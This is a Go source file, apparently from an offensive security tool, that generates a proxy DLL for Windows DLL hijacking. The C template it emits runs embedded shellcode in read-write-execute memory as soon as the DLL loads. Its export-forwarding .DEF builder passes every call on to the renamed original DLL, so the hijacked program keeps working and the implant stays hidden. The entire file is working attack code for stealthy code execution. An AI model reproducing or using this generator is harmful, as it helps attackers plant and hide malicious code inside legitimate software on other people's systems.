package commands

import (
	"encoding/hex"
	"fmt"
	"strings"
)

type proxyExportEntry struct {
	Ordinal   uint32 `json:"ordinal"`
	Name      string `json:"name"`
	Forwarder string `json:"forwarder"`
}

func proxyDLLCSource(_ []proxyExportEntry, _ string, shellcodeBytes []byte) string {
	var sb strings.Builder

	sb.WriteString("#include <windows.h>\n\n")
	sb.WriteString("static unsigned char payload[] = {")
	for i, b := range shellcodeBytes {
		if i%16 == 0 {
			sb.WriteString("\n    ")
		}
		sb.WriteString(fmt.Sprintf("0x%02X", b))
		if i < len(shellcodeBytes)-1 {
			sb.WriteString(", ")
		}
	}
	sb.WriteString("\n};\n\n")

	sb.WriteString(`DWORD WINAPI PayloadThread(LPVOID lpParameter) {
    void (*func)(void) = (void(*)(void))lpParameter;
    func();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        LPVOID mem = VirtualAlloc(NULL, sizeof(payload),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (mem) {
            CopyMemory(mem, payload, sizeof(payload));
            HANDLE hThread = CreateThread(NULL, 0, PayloadThread, mem, 0, NULL);
            if (hThread) CloseHandle(hThread);
        }
    }
    return TRUE;
}
`)

	return sb.String()
}

func proxyDLLDEFFile(exports []proxyExportEntry, renamedDLLBaseName string) string {
	var sb strings.Builder

	renamedBase := strings.TrimSuffix(renamedDLLBaseName, ".dll")

	sb.WriteString("EXPORTS\n")
	for _, exp := range exports {
		if exp.Forwarder != "" {
			continue
		}
		if exp.Name != "" {
			sb.WriteString(fmt.Sprintf("    %s=%s.%s @%d\n",
				exp.Name, renamedBase, exp.Name, exp.Ordinal))
		} else {
			sb.WriteString(fmt.Sprintf("    noname_%d=%s.#%d @%d NONAME\n",
				exp.Ordinal, renamedBase, exp.Ordinal, exp.Ordinal))
		}
	}

	return sb.String()
}

func proxyRenamedDLLName(originalName string) string {
	base := strings.TrimSuffix(originalName, ".dll")
	base = strings.TrimSuffix(base, ".DLL")
	return base + "_orig.dll"
}

func shellcodeFromHex(hexStr string) ([]byte, error) {
	hexStr = strings.ReplaceAll(hexStr, " ", "")
	hexStr = strings.ReplaceAll(hexStr, "\n", "")
	hexStr = strings.ReplaceAll(hexStr, "\r", "")
	hexStr = strings.ReplaceAll(hexStr, "0x", "")
	hexStr = strings.ReplaceAll(hexStr, ",", "")
	return hex.DecodeString(hexStr)
}
